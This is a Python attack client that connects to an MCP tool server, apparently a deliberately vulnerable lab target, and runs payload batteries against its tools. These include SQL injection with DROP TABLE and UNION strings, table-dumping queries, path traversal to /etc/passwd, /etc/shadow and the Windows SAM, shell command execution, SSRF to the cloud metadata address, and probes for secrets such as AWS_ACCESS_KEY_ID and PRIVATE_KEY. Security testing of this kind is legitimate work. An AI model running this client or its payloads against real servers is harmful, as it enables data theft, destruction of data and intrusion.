import asyncio
import sys
import json
import requests
from typing import Optional, Dict, Any
from contextlib import AsyncExitStack
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


class ComprehensiveAttackClient:
    def __init__(self):
        self.session: Optional[ClientSession] = None
        self.exit_stack = AsyncExitStack()
        self.success_metrics = {
            "sql_injection": {"success": 0, "total": 0},
            "arbitrary_sql": {"success": 0, "total": 0},
            "file_access": {"success": 0, "total": 0},
            "command_execution": {"success": 0, "total": 0},
            "network_attacks": {"success": 0, "total": 0},
            "crypto_weaknesses": {"success": 0, "total": 0},
            "env_exposure": {"success": 0, "total": 0},
            "system_info": {"success": 0, "total": 0},
            "path_traversal": {"success": 0, "total": 0},
            "process_manipulation": {"success": 0, "total": 0},
        }

    async def connect_to_server(self, server_script_path: str):
        """Connect to MCP server via STDIO transport."""
        is_python = server_script_path.endswith(".py")
        is_js = server_script_path.endswith(".js")
        if not (is_python or is_js):
            raise ValueError("Server script must be a .py or .js file")
        command = "python" if is_python else "node"
        server_params = StdioServerParameters(
            command=command, args=[server_script_path], env=None
        )
        stdio_transport = await self.exit_stack.enter_async_context(
            stdio_client(server_params)
        )
        self.stdio, self.write = stdio_transport
        self.session = await self.exit_stack.enter_async_context(
            ClientSession(self.stdio, self.write)
        )
        await self.session.initialize()
        print("Connected to MCP server via STDIO transport.")

    async def test_sql_injection(self):
        """Test SQL injection vulnerabilities."""
        print("\n[*] Testing SQL Injection...")
        payloads = [
            "test');--",
            "test'--",
            "' OR 1=1 --",
            "' OR '1'='1",
            "test', 'malicious');--",
            "; DROP TABLE records; --",
            "Robert'); DROP TABLE records;--",
            "' UNION SELECT 1, 'pwned', 'pwned', 'pwned', 'pwned'--",
            "admin' #",
            "' OR '' = '",
            "test' OR '1'='1' --",
            "'; INSERT INTO records (name, address) VALUES ('hacked', 'hacked');--",
        ]

        for payload in payloads:
            print(f"  Trying payload: {payload}")
            try:
                result = await self.session.call_tool(
                    "insert_record",
                    {
                        "name": payload,
                        "address": "123 Exploit St",
                        "email": "test@evil.com",
                        "phone": "555-0123",
                        "credit_card": "4532-1234-5678-9012",
                    },
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content}")
                if isinstance(content, str) and (
                    "Record inserted" in content
                    or "error" not in content.lower()
                ):
                    self.success_metrics["sql_injection"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["sql_injection"]["total"] = len(payloads)

    async def test_arbitrary_sql_execution(self):
        """Test arbitrary SQL execution."""
        print("\n[*] Testing Arbitrary SQL Execution...")
        queries = [
            "SELECT sqlite_version();",
            "SELECT name FROM sqlite_master WHERE type='table';",
            "SELECT * FROM records;",
            "SELECT sql FROM sqlite_master WHERE type='table';",
            "PRAGMA table_info(records);",
            "SELECT COUNT(*) FROM records;",
            "SELECT name, address FROM records WHERE name LIKE '%Alice%';",
        ]

        for query in queries:
            print(f"  Query: {query}")
            try:
                result = await self.session.call_tool(
                    "execute_sql", {"query": query}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content}")
                if content and len(str(content)) > 0:
                    self.success_metrics["arbitrary_sql"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["arbitrary_sql"]["total"] = len(queries)

    async def test_file_access(self):
        """Test file system access vulnerabilities."""
        print("\n[*] Testing File Access...")
        file_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/proc/version",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../etc/shadow",
            "..\\..\\..\\boot.ini",
            "/etc/hosts",
            "C:\\Windows\\win.ini",
        ]

        for payload in file_payloads:
            print(f"  Trying file: {payload}")
            try:
                result = await self.session.call_tool(
                    "read_file", {"file_path": payload}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content[:200]}...")
                if (
                    content
                    and len(str(content)) > 10
                    and "Error reading file" not in str(content)
                ):
                    self.success_metrics["file_access"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["file_access"]["total"] = len(file_payloads)

    async def test_command_execution(self):
        """Test command execution vulnerabilities."""
        print("\n[*] Testing Command Execution...")
        cmd_payloads = [
            "whoami",
            "id",
            "uname -a",
            "ls -la",
            "dir",
            "echo 'command injection test'",
            "ping -c 1 127.0.0.1",
            "cat /etc/passwd",
            "type C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        for payload in cmd_payloads:
            print(f"  Trying command: {payload}")
            try:
                result = await self.session.call_tool(
                    "execute_command", {"command": payload}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content}")
                if (
                    content
                    and "Output:" in str(content)
                    and "Error executing command" not in str(content)
                ):
                    self.success_metrics["command_execution"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["command_execution"]["total"] = len(cmd_payloads)

    async def test_network_attacks(self):
        """Test network-based attacks (SSRF)."""
        print("\n[*] Testing Network Attacks (SSRF)...")
        ssrf_payloads = [
            "http://localhost:22",
            "http://169.254.169.254/metadata",
            "file:///etc/passwd",
            "http://internal.service:8080",
            "gopher://127.0.0.1:25",
            "http://localhost:80",
            "http://127.0.0.1:9000",
            "https://httpbin.org/get",
        ]

        for payload in ssrf_payloads:
            print(f"  Trying URL: {payload}")
            try:
                result = await self.session.call_tool(
                    "make_request", {"url": payload}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content}")
                if content and "Status:" in str(content):
                    self.success_metrics["network_attacks"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["network_attacks"]["total"] = len(ssrf_payloads)

    async def test_crypto_weaknesses(self):
        """Test cryptographic weaknesses."""
        print("\n[*] Testing Cryptographic Weaknesses...")
        weak_algos = ["md5", "sha1", "sha224"]
        test_data = "sensitive_data_123"

        for algo in weak_algos:
            print(f"  Testing algorithm: {algo}")
            try:
                result = await self.session.call_tool(
                    "generate_hash", {"data": test_data, "algorithm": algo}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content}")
                if content and len(str(content)) > 10:
                    self.success_metrics["crypto_weaknesses"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["crypto_weaknesses"]["total"] = len(weak_algos)

    async def test_env_variable_exposure(self):
        """Test environment variable exposure."""
        print("\n[*] Testing Environment Variable Exposure...")
        env_vars = [
            "SECRET_KEY",
            "PATH",
            "USER",
            "USERNAME",
            "HOME",
            "TEMP",
            "COMSPEC",
            "SHELL",
            "PYTHONPATH",
            "APPDATA",
            "LOCALAPPDATA",
            "PROGRAMFILES",
            "SYSTEMROOT",
            "NUMBER_OF_PROCESSORS",
            "PROCESSOR_IDENTIFIER",
            "AWS_ACCESS_KEY_ID",
            "DATABASE_URL",
            "API_KEY",
            "PRIVATE_KEY",
            "SESSION_SECRET",
        ]

        for var in env_vars:
            print(f"  Env var: {var}")
            try:
                result = await self.session.call_tool(
                    "get_env_variable", {"var_name": var}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content}")
                if (
                    isinstance(content, str)
                    and content != "Variable not found"
                    and content.strip() not in ["", "''", '""']
                ):
                    self.success_metrics["env_exposure"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["env_exposure"]["total"] = len(env_vars)

    async def test_system_info_exposure(self):
        """Test system information exposure."""
        print("\n[*] Testing System Information Exposure...")
        try:
            result = await self.session.call_tool("get_system_info", {})
            content = getattr(result, "content", result)
            print(f"  System info: {content[:500]}...")
            if content and len(str(content)) > 50:
                self.success_metrics["system_info"]["success"] += 1
        except Exception as e:
            print(f"  Error: {e}")
        self.success_metrics["system_info"]["total"] = 1

    async def test_path_traversal(self):
        """Test path traversal vulnerabilities."""
        print("\n[*] Testing Path Traversal...")
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/proc/version",
            "../../../../etc/shadow",
            "..\\..\\..\\boot.ini",
        ]

        for payload in traversal_payloads:
            print(f"  Trying path: {payload}")
            try:
                result = await self.session.call_tool(
                    "read_file", {"file_path": payload}
                )
                content = getattr(result, "content", result)
                print(f"  Result: {content[:200]}...")
                if (
                    content
                    and "Error reading file" not in str(content)
                    and len(str(content)) > 10
                ):
                    self.success_metrics["path_traversal"]["success"] += 1
            except Exception as e:
                print(f"  Error: {e}")
        self.success_metrics["path_traversal"]["total"] = len(
            traversal_payloads
        )

    async def test_process_manipulation(self):
        """Test process manipulation vulnerabilities."""
        print("\n[*] Testing Process Manipulation...")
        try:
            # Test process listing
            result = await self.session.call_tool("list_processes", {})
            content = getattr(result, "content", result)
            print(f"  Process list: {content[:300]}...")
            if content and "PID:" in str(content):
                self.success_metrics["process_manipulation"]["success"] += 1
        except Exception as e:
            print(f"  Error: {e}")
        self.success_metrics["process_manipulation"]["total"] = 1

    async def test_tool_enumeration(self):
        """Test tool enumeration capabilities."""
        print("\n[*] Testing Tool Enumeration...")
        try:
            response = await self.session.list_tools()
            tools = getattr(response, "tools", None)
            if tools and len(tools) > 0:
                print(f"  Available tools: {[tool.name for tool in tools]}")
                return True
            else:
                print("  No tools found or list_tools not supported.")
                return False
        except Exception as e:
            print(f"  Error enumerating tools: {e}")
            return False

    def generate_report(self):
        """Generate comprehensive attack report."""
        total_success = sum(m["success"] for m in self.success_metrics.values())
        total_tests = sum(m["total"] for m in self.success_metrics.values())

        print("\n" + "=" * 60)
        print(f"COMPREHENSIVE MCP ATTACK REPORT")
        print("=" * 60)
        print(
            f"Overall Success Rate: {total_success}/{total_tests} ({100 * total_success / total_tests:.1f}%)"
        )
        print()

        for category, metrics in self.success_metrics.items():
            if metrics["total"] > 0:
                rate = 100 * metrics["success"] / metrics["total"]
                status = "✓ VULNERABLE" if rate > 0 else "✗ SECURE"
                print(
                    f"{category.replace('_', ' ').title():<25}: {metrics['success']:2}/{metrics['total']:2} ({rate:5.1f}%) {status}"
                )

        print("=" * 60)

        # Vulnerability summary
        vulnerable_categories = [
            cat
            for cat, metrics in self.success_metrics.items()
            if metrics["total"] > 0 and metrics["success"] > 0
        ]

        if vulnerable_categories:
            print(f"\nVULNERABILITIES FOUND: {len(vulnerable_categories)}")
            for cat in vulnerable_categories:
                print(f"  - {cat.replace('_', ' ').title()}")
        else:
            print("\nNo vulnerabilities detected.")

        print("=" * 60)

    async def cleanup(self):
        """Clean up resources."""
        await self.exit_stack.aclose()


async def main():
    """Main attack execution function."""
    if len(sys.argv) < 2:
        print(
            "Usage: python comprehensive_attack_client.py <path_to_server_script>"
        )
        print(
            "Example: python comprehensive_attack_client.py vuln_mcp_stdio.py"
        )
        sys.exit(1)

    client = ComprehensiveAttackClient()
    try:
        await client.connect_to_server(sys.argv[1])

        # Test tool enumeration first
        tools_available = await client.test_tool_enumeration()
        if not tools_available:
            print(
                "Warning: Could not enumerate tools, continuing with tests..."
            )

        # Run all attack tests
        await client.test_sql_injection()
        await client.test_arbitrary_sql_execution()
        await client.test_file_access()
        await client.test_command_execution()
        await client.test_network_attacks()
        await client.test_crypto_weaknesses()
        await client.test_env_variable_exposure()
        await client.test_system_info_exposure()
        await client.test_path_traversal()
        await client.test_process_manipulation()

        # Generate final report
        client.generate_report()

    except Exception as e:
        print(f"Error during attack execution: {e}")
    finally:
        await client.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
